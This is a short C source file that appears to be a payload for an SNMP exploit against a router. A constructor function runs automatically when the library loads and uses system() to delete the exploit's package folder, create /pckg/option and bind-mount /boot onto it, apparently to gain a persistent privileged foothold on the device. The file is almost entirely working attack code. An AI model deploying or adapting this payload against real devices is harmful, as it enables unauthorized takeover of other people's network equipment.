#include "snmp_exec.h"
#include <stdlib.h>

void __attribute__((constructor)) lol(void)
{
    system("rm -rf /ram/pckg/snmp_xploit; mkdir /pckg/option; mount -o bind /boot/ /pckg/option;");
}
 
extern void autorun(void)
{
    // do nothin' I guess?
    return; 
}
